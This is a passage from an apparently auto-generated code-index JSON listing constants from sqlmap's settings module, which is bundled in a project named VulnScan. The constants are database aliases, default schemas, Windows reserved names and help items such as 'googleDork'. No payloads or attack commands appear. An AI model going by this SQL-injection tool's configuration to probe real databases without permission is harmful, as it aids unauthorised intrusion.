        "peekOfCode": "FRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RAIMA_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIRTUOSO_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DBMS_DIRECTORY_DICT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_DBMS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUPPORTED_OS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DBMS_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "USER_AGENT_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "USER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFERER_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HOST_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HOST_ALIASES = (\"host\",)\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_CASE_DBMSES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.DERBY, DBMS.ALTIBASE))\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_DEFAULT_SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "H2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_DEFAULT_SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_DEFAULT_SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_DEFAULT_SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CACHE_DEFAULT_SCHEMA = \"SQLUser\"\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",\n    \"data\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLUS_ONE_DBMSES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",\n    \"data\",\n    \"cookie\",\n    \"randomAgent\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WINDOWS_RESERVED_NAMES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
